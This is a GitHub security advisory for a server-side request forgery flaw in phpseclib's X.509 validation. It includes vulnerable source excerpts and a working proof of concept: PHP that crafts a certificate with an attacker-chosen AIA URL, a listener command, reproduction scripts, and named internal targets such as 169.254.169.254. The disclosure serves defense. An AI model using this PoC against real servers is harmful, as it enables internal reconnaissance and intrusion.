# [M] phpseclib: X.509 certificate validation sends attacker-controlled outbound requests (server-side request forgery) via Authority Information Access

## Summary
Severity: Medium
Advisory: GHSA-m557-wrgg-6rp4
CVE: CVE-2026-55599
CWE: CWE-918
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2026-06-16
Source: https://github.com/advisories/GHSA-m557-wrgg-6rp4
Type: github-advisory

## Affected
- Packagist: `phpseclib/phpseclib` — affected >=0.1.1 <1.0.30
- Packagist: `phpseclib/phpseclib` — affected >=2.0.0 <2.0.55
- Packagist: `phpseclib/phpseclib` — affected >=3.0.0 <3.0.54

## Details
### Summary

When an application validates an untrusted X.509 certificate with phpseclib, **X509::validateSignature()** reads a URL out of that certificate's Authority Information Access (AIA) extension and connects to it. Attacker who supplies certificate fully controls host, port, and path of that connection. URL fetching is enabled by default, and no destination is blocked. An unauthenticated attacker can therefore make a validating server open connections to internal hosts and ports it should never reach, for example loopback **127.0.0.1**, cloud metadata address **169.254.169.254**, and internal-only services. This is a server-side request forgery (SSRF) caused by an insecure default. It is reproducible on current released LTS 3.0.53 and on 4.0 development line.

### Details

When no already-trusted certificate authority is the issuer of certificate under validation, **validateSignatureCountable()** continues to AIA fetching. Default for **validateSignature()** is **caonly = true**:

```
// phpseclib/File/X509.php:1316-1327 (4.0 development line, commit 74ada1a6)
if (!isset($signingCert)) {
    if ($caonly) {
        return $this->testForIntermediate(true, $count) && $this->validateSignature(true);
    } else {
        try {
            $this->testForSelfSigned();
            $signingCert = $this;
        } catch (BadMethodCallException) {
            return $this->testForIntermediate(true, $count) && $this->validateSignature(true);
        }
    }
}
```

**testForIntermediate()** takes URL straight out of certificate's AIA caIssuers field and fetches it. Value comes directly from certificate content and is never restricted:

```
// phpseclib/File/X509.php:1357-1391 (4.0 development line)
$opts = $this->getExtension('id-pe-authorityInfoAccess');
...
foreach ($opts['extnValue'] as $opt) {
    if ($opt['accessMethod'] == 'id-ad-caIssuers') {
        if (isset($opt['accessLocation']['uniformResourceIdentifier'])) {
            $url = (string) $opt['accessLocation']['uniformResourceIdentifier']; // attacker controlled
            break;
        }
    }
}
...
$cert = static::fetchURL($url); // server-side request forgery
```

**fetchURL()** connects to attacker host and port. There is no destination validation: no block on loopback, link-local, private, or metadata ranges, and no port restriction:

```
// phpseclib/File/X509.php:1456-1476 (4.0 development line)
private static function fetchURL(string $url): ?string
{
    if (self::$disable_url_fetch) {  // default false, so fetching happens
        return null;
    }
    $parts = parse_url($url);
    switch ($parts['scheme']) {
        case 'http':
            $fsock = @fsockopen($parts['host'], $parts['port'] ?? 80); // attacker host and port
            ...
            fputs($fsock, "GET $path HTTP/1.0\r\n");
            fputs($fsock, "Host: $parts[host]\r\n\r\n");
```

Fetching is on by default:

```
// phpseclib/File/X509.php:110 (4.0 development line)
private static bool $disable_url_fetch = false;
```

Same default-enabled logic exists in released 3.0.x. In 3.0.53 it sits at **$disable_url_fetch = false** on line 255 and **fsockopen($parts['host'], ...)** on line 1136 of **phpseclib/File/X509.php**.

Why this is a vulnerability and not merely a feature. AIA chasing is a legitimate capability described by RFC 4325, and this report does not claim fetching is wrong in itself. Vulnerability is the combination of three properties that together match definition of SSRF:

1. URL comes from untrusted input. It is read out of certificate that an application is trying to validate, which is exactly the data an attacker controls.
2. Fetching is enabled by default. An integrator who simply calls **validateSignature()** gets outbound requests with no opt-in. Only control, **X509::disableURLFetch()**, is off by default, so secure behaviour requires knowing about and calling a method that most callers never see.
3. No destination is restricted. Loopback, private ranges, link-local metadata, and arbitrary ports are all reachable. Mature implementations of AIA fetching restrict destinations precisely to prevent this.

Reachability is not narrow. Fetch triggers whenever certificate's issuer is not already trusted, which an attacker arranges trivially by choosing any issuer name that is not in trust store. Having certificate authorities loaded does not protect a target: an attacker certificate that claims an unknown issuer still reaches **testForIntermediate()**.

Response handling is blind. Fetched body is used only if it parses as a certificate, and is otherwise discarded, so an attacker does not directly read internal responses through this path. That limits confidentiality impact but does not remove request-forgery and reconnaissance capability.

### PoC

Two reproductions follow: current released LTS 3.0.53, and 4.0 development line. Malicious certificate is plain PEM and is identical for both, since certificate format is the same across versions.

Build malicious certificate once (this uses 4.0 to build, but any tool that emits an X.509 certificate with an AIA caIssuers URL works):

```
composer require phpseclib/phpseclib:4.0.x-dev
```

```php
<?php
require 'vendor/autoload.php';

use phpseclib4\Crypt\RSA;
use phpseclib4\File\X509;

$url = 'http://127.0.0.1:19090/ssrf';

$key  = RSA::createKey(2048)->withPadding(RSA::SIGNATURE_PKCS1)->withHash('sha256');
$cert = new X509($key->getPublicKey());
$cert->addDNProp('id-at-commonName', 'attacker-leaf.example');
$cert->setEndDate('lifetime');
$cert->setExtension('id-pe-authorityInfoAccess', [
    ['accessMethod' => 'id-ad-caIssuers',
     'accessLocation' => ['uniformResourceIdentifier' => $url]],
]);
$key->sign($cert);
file_put_contents('attacker_cert.pem', (string) $cert);
```

Stand up a listener that represents an internal service on a port that is not otherwise reachable from outside:

```
php -r '$s=stream_socket_server("tcp://127.0.0.1:19090",$e,$m);$c=stream_socket_accept($s,20);echo fread($c,4096);'
```

Reproduction on released LTS 3.0.53. Install it and have an application validate certificate:

```
composer require phpseclib/phpseclib:~3.0.0
```

```php
<?php
require 'vendor/autoload.php';

use phpseclib3\File\X509;

$v = new X509();
$v->loadX509(file_get_contents('attacker_cert.pem'));
$v->validateSignature();   // connects to 127.0.0.1:19090 during validation
```

Reproduction on 4.0 development line. Same certificate, 4.0 namespace:

```php
<?php
require 'vendor/autoload.php';

use phpseclib4\File\X509;

X509::clearCAStore();      // attacker cert issuer is not trusted
$v = X509::load(file_get_contents('attacker_cert.pem'));
$v->validateSignature();   // connects to 127.0.0.1:19090 during validation
```

Observed result, on both 3.0.53 and 4.0.x-dev. Listener receives a request whose host, port, and path all come from certificate, even though **validateSignature()** returns false:

```
GET /ssrf HTTP/1.0
Host: 127.0.0.1
```

This was also confirmed end to end over HTTP: an unauthenticated POST of certificate to an endpoint that calls **loadX509()** then **validateSignature()** makes server connect outbound to attacker-chosen **127.0.0.1:19090**. Changing host and port in certificate reaches any internal address and port, for example **169.254.169.254** or **127.0.0.1:6379**.

Negative control. With **X509::disableURLFetch()** set before validation, validation returns false and no outbound connection is made. This confirms both root cause and that default-on behaviour is the trigger.

### Impact

This is a server-side request forgery (CWE-918) caused by an insecure default (CWE-276): URL fetching is enabled by default and applies no destination restrictions while acting on untrusted certificate content.

An application is affected when it validates an attacker-influenced certificate, which covers client-certificate checks implemented in PHP, S/MIME and CMS signer verification, document and code-signing validation, and any feature that verifies an uploaded or pasted certificate. No authentication and no user interaction are needed.

What an attacker gains:

- Internal reconnaissance and port scanning. Connection success or failure and timing reveal which internal hosts and ports respond.
- Interaction with internal-only HTTP services such as admin panels, dashboards, and webhooks bound to loopback or private ranges.
- Requests to cloud metadata endpoints such as **169.254.169.254**, which answer plain HTTP GET on some providers.

Because fetch is blind, an attacker does not read internal response bodies through this path directly, so this is a request-forgery and reconnaissance primitive rather than direct disclosure of internal data. Any reflective sink elsewhere in an application, or any internal endpoint that performs an action on a GET, increases real impact.

Suggested fix, strongest first: default **disableURLFetch** to true so AIA chasing is opt-in; if it stays enabled, validate destinations inside **fetchURL()** by rejecting loopback, link-local, and private addresses and restricting ports, and add an egress policy callback similar to existing **setCRLLookupCallback()**; and state plainly in documentation that validating an untrusted certificate can cause outbound requests to URLs found inside that certificate.

## References
- https://github.com/phpseclib/phpseclib/security/advisories/GHSA-m557-wrgg-6rp4
- https://nvd.nist.gov/vuln/detail/CVE-2026-55599
- https://github.com/phpseclib/phpseclib
